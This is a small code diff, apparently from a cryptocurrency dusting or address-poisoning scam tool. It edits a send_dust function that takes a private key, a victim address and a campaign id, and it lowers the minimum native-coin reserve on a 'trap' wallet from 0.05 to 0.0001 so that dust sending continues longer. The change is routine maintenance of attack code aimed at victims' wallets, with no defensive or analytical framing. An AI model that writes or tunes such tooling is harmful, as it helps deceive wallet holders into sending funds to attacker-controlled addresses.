@@ -403,7 +403,7 @@ def send_dust(private_key, victim_address, campaign_id=None):
 
         native_balance = call_with_retry(w3.eth.get_balance, trap)
 
-        MIN_RESERVE_NATIVE = float(os.getenv("MIN_RESERVE_NATIVE", "0.05"))
+        MIN_RESERVE_NATIVE = float(os.getenv("MIN_RESERVE_NATIVE", "0.0001"))
         threshold_wei = w3.to_wei(MIN_RESERVE_NATIVE, 'ether')
         now = time.time()
         if native_balance < threshold_wei:
